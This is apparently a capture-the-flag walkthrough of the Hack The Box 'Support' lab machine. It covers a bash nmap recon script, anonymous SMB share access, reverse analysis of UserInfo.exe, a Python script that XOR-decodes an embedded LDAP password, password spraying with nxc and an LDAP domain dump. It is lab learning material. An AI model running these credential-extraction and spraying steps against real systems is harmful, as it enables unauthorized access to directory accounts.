
``` bash

#!/bin/bash

ip=$1
current_dir=$(pwd)

if [ $# -ne 1 ]; then
    echo "Usage: $0 <ip>"
    exit 1
fi

sleep 2

nmap -p- -sS -Pn --min-rate 5000 "$ip" -oN "$current_dir"/all_ports.txt 2>/dev/null

echo -e "\e[32m[*] First script done\e[0m"

sleep 2

ports=$(grep "^[0-9]" "$current_dir"/all_ports.txt | cut -d "/" -f1 | paste -sd "," -)

sleep 1

echo -e "\e[32m[*] Open ports = '$ports'\e[0m"

sleep 1

nmap -p "$ports" -sCV -Pn --min-rate 5000 "$ip" -oN "$current_dir"/version_ports.txt 2>/dev/null

echo -e "\e[32m[*] Done\e[0m"

```

``` bash

❯ recon 10.129.45.16
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-14 17:46 +0200
Nmap scan report for 10.129.45.16
Host is up (0.039s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49680/tcp open  unknown
49692/tcp open  unknown
49708/tcp open  unknown
50032/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 40.17 seconds
[*] First script done
[*] Open ports = '53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49680,49692,49708,50032'
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-14 17:47 +0200
Nmap scan report for 10.129.45.16
Host is up (0.038s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-14 15:47:47Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
50032/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-07-14T15:48:39
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.72 seconds
[*] Done
╭─ ~/hacking/ctf/htb/easy/support/recon                                                                   ✔ │ 2m 23s ─╮
╰─

```

``` bash

❯ smbclient -L \\10.129.45.16 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.45.16 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
╭─ ~/hacking/ctf/htb/easy/support/recon                                                                            ✔ ─╮
╰─                                                                                                                   ─╯
```

``` bash

❯ smbclient  //10.129.45.16/SYSVOL -N
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \>

```

``` bash

❯ smbclient  //10.129.45.16/support-tools -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 19:01:06 2022
  ..                                  D        0  Sat May 28 13:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 13:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 13:19:55 2022
  putty.exe                           A  1273576  Sat May 28 13:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 13:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 19:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 13:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022

                4026367 blocks of size 4096. 969658 blocks available
smb: \>

```

``` bash

smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (640.7 KiloBytes/sec) (average 640.7 KiloBytes/sec)
smb: \> exit
❯ ls | grep "Us*"
UserInfo.exe.zip
❯ file UserInfo.exe.zip
UserInfo.exe.zip: Zip archive data, made by v2.0 UNIX, extract using at least v2.0, last modified May 27 2022 10:51:04, uncompressed size 12288, method=deflate
╭─ ~/hacking/ctf/htb/easy/support/recon                                                                            ✔ ─╮
╰─

```

``` bash

❯ unzip UserInfo.exe.zip
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe
  inflating: CommandLineParser.dll
  inflating: Microsoft.Bcl.AsyncInterfaces.dll
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll
  inflating: Microsoft.Extensions.DependencyInjection.dll
  inflating: Microsoft.Extensions.Logging.Abstractions.dll
  inflating: System.Buffers.dll
  inflating: System.Memory.dll
  inflating: System.Numerics.Vectors.dll
  inflating: System.Runtime.CompilerServices.Unsafe.dll
  inflating: System.Threading.Tasks.Extensions.dll
  inflating: UserInfo.exe.config

```

``` bash

❯ strings UserInfo.exe
!This program cannot be run in DOS mode.
.text
`.rsrc
@.reloc
,Er
,ZsE
BSJB
v4.0.30319
#Strings
#GUID
#Blob
<Main>d__0
<>u__1
Task`1
CommandLineParser`1
TaskAwaiter`1
IParserResult`1
Int32
<OnExecuteAsync>d__2
Command`2
Int64
<Module>
<Main>
get_ASCII
mscorlib
ParseAsync
OnExecuteAsync
get_PropertiesToLoad
Protected
AwaitUnsafeOnCompleted
get_IsCompleted
System.Collections.Specialized
<UserName>k__BackingField
<LastName>k__BackingField
<FirstName>k__BackingField
<Verbose>k__BackingField
MatthiWare.CommandLine.Abstractions.Command
getPassword
enc_password
get_Message
IDisposable
Console
set_AppName
get_UserName
set_UserName
get_LastName
set_LastName
get_FirstName
set_FirstName
username
FromFileTime
DateTime
FindOne
MatthiWare.CommandLine
WriteLine
IAsyncStateMachine
SetStateMachine
stateMachine
ValueType
set_AuthenticationType
OnConfigure
ReadOnlyCollectionBase
get_Verbose
set_Verbose
verbose
Dispose
Create
<>1__state
Write
RequiredAttribute
CompilerGeneratedAttribute
GuidAttribute
DebuggableAttribute
ComVisibleAttribute
AssemblyTitleAttribute
NameAttribute
AsyncStateMachineAttribute
DefaultValueAttribute
AssemblyTrademarkAttribute
TargetFrameworkAttribute
DebuggerHiddenAttribute
AssemblyFileVersionAttribute
AssemblyConfigurationAttribute
AssemblyDescriptionAttribute
CompilationRelaxationsAttribute
AssemblyProductAttribute
AssemblyCopyrightAttribute
AssemblyCompanyAttribute
RuntimeCompatibilityAttribute
value
UserInfo.exe
System.Threading
Encoding
System.Runtime.Versioning
FromBase64String
ToString
GetString
MatthiWare.CommandLine.Abstractions.Parsing
get_Task
FindAll
Program
get_Item
System
CancellationToken
cancellationToken
Main
System.Reflection
ResultPropertyValueCollection
StringCollection
SearchResultCollection
ResultPropertyCollection
SetException
Description
UserInfo
AsyncTaskMethodBuilder
ICommandConfigurationBuilder
<>t__builder
DirectorySearcher
FindUser
GetUser
printUser
CommandLineParser
TaskAwaiter
GetAwaiter
set_Filter
IEnumerator
GetEnumerator
.ctor
.cctor
System.Diagnostics
UserInfo.Commands
DiscoverCommands
UserInfo.Services
System.Runtime.InteropServices
System.Runtime.CompilerServices
System.DirectoryServices
DebuggingModes
get_Properties
AuthenticationTypes
MatthiWare.CommandLine.Core.Attributes
GetBytes
args
System.Threading.Tasks
Contains
System.Collections
commandOptions
GlobalOptions
FindUserOptions
GetUserOptions
CommandLineParserOptions
options
get_HasErrors
Concat
Object
get_Default
SearchResult
GetResult
SetResult
get_Current
get_Count
Start
Convert
last
first
MoveNext
System.Text
GetExecutingAssembly
LdapQuery
query
DirectoryEntry
entry
WrapNonExceptionThrows
UserInfo
Copyright
  2022
$5a280d0b-9fd0-4701-8f96-82e2f1ea9dfb
1.0.0.0
.NETFramework,Version=v4.8
FrameworkDisplayName
.NET Framework 4.8
UserInfo.Program+<Main>d__0
/UserInfo.Commands.FindUser+<OnExecuteAsync>d__2
.UserInfo.Commands.GetUser+<OnExecuteAsync>d__2
username
Username
first
First name
last
        Last name
verbose
Verbose output
RSDS
C:\Users\0xdf\source\repos\UserInfo\obj\Release\UserInfo.pdb
_CorExeMain
mscoree.dll
╭─ ~/hacking/ctf/htb/easy/support/recon                                                                            ✔ ─╮
╰─

```
``` bash
❯ file UserInfo.exe
UserInfo.exe: PE32 executable for MS Windows 6.00 (console), Intel i386 Mono/.Net assembly, 3 sections
❯
```

<img width="758" height="576" alt="image" src="https://github.com/user-attachments/assets/528a16e8-0570-4b4d-a78f-1d491c710771" />


<img width="294" height="442" alt="image" src="https://github.com/user-attachments/assets/e9539da2-6247-4a54-8797-0f0087c17187" />


<img width="594" height="278" alt="image" src="https://github.com/user-attachments/assets/9bcb9c78-b7b6-4830-8e55-3bd9acc598f2" />

``` bash

❯ echo '10.129.178.26 support.htb' | sudo tee -a /etc/hosts
10.129.178.26 support.htb
╭─ ~                                                                                                               ✔ ─╮
╰─                                                                                                                   ─╯
```

<img width="538" height="273" alt="image" src="https://github.com/user-attachments/assets/783682d3-2743-45f7-a0c3-02f3715cd4c3" />

<img width="687" height="122" alt="image" src="https://github.com/user-attachments/assets/e7482c93-dbc7-46a6-adeb-b6fdf0e19167" />

``` bash

❯
❯ hashid '0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E'
Analyzing '0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E'
[+] Unknown hash
❯ echo '0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E' | base64 -d
������������ۚ����ֆՖ������������%                                                                                         ╭─ ~                                                                                                               ✔ ─╮
╰─

```

<img width="736" height="403" alt="image" src="https://github.com/user-attachments/assets/39688914-3742-4495-86f4-4c872f84c021" />

``` python

import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

data = bytearray(base64.b64decode(enc_password))

for i in range(len(data)):
    data[i] = (data[i] ^ key[i % len(key)]) ^ 0xDF

print(data.decode())

```

``` bash
❯ python3 getpassword.py
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
╭─ ~/hacking/ctf/htb/easy/support/scripts                                                                          ✔ ─╮
╰─                                        

```

``` bash

❯ wine UserInfo.exe

Usage: UserInfo.exe [options] [commands]

Options:
  -v|--verbose        Verbose output

Commands:
  find                Find a user
  user                Get information about a user

╭─ ~/hacking/ctf/htb/easy/support/recon                                                                            ✔ ─╮
╰─

```

``` powershell
PS Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\kali-linux\home\joel\hacking\ctf\htb\easy\support\recon> .\UserInfo.exe -v find -first "*"
[*] LDAP query to use: (givenName=*)
[+] Found 15 results:
       raven.clifton
       anderson.damian
       monroe.david
       cromwell.gerard
       west.laura
       levine.leopoldo
       langley.lucy
       daughtler.mabel
       bardot.mary
       stoll.rachelle
       thomas.raphael
       smith.rosario
       wilson.shelby
       hernandez.stanley
       ford.victoria
PS Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\kali-linux\home\joel\hacking\ctf\htb\easy\support\recon>
```
``` bash

❯ nxc ldap support.htb -u usernames.txt -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
LDAP        10.129.45.182   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.45.182   389    DC               [-] support.htb\raven.clifton:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\anderson.damian:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\monroe.david:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\cromwell.gerard:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\west.laura:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\levine.leopoldo:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\langley.lucy:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\daughtler.mabel:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\bardot.mary:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\stoll.rachelle:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\thomas.raphael:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\smith.rosario:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\wilson.shelby:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\hernandez.stanley:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\ford.victoria:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\guest:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
LDAP        10.129.45.182   389    DC               [-] support.htb\:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz Error connecting to the domain, are you sure LDAP service is running on the target?
Error: [Errno 104] Connection reset by peer
╭─ ~/hacking/ctf/htb/easy/support/recon                                                                       ✔ │ 5s ─╮
╰─                                                                                                                   ─╯

```

``` bash
❯ mono UserInfo.exe -v find -last "test"
[*] LDAP query to use: (sn=test)
[-] Exception: No Such Object
╭─ ~/hacking/ctf/htb/easy/support/recon                                                                            ✔ ─╮
╰─
```
<img width="1915" height="250" alt="image" src="https://github.com/user-attachments/assets/843bd312-2118-4bd0-9fa5-070f571d5e93" />

<img width="691" height="316" alt="image" src="https://github.com/user-attachments/assets/129ae035-3a42-4166-adf0-990bd7621695" />

``` bash

❯ nxc ldap support.htb -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
LDAP        10.129.45.182   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.45.182   389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
╭─ ~/hacking/ctf/htb/easy/support/recon                                                                            ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash

❯ ldapdomaindump 10.129.45.182 -u 'support.htb\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -o ./ldap_out
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
╭─ ~/hacking/ctf/htb/easy/support/recon                                                                            ✔ ─╮
╰─                                                                                                                   ─╯

```

``` bash
❯ cd ldap_out
❯ ls
domain_computers_by_os.html  domain_groups.grep  domain_policy.html  domain_trusts.json          domain_users.json
domain_computers.grep        domain_groups.html  domain_policy.json  domain_users_by_group.html
domain_computers.html        domain_groups.json  domain_trusts.grep  domain_users.grep
domain_computers.json        domain_policy.grep  domain_trusts.html  domain_users.html
╭─ ~/hacking/ctf/htb/easy/support/recon/ldap_out                                                                   ✔ ─╮
╰─
```

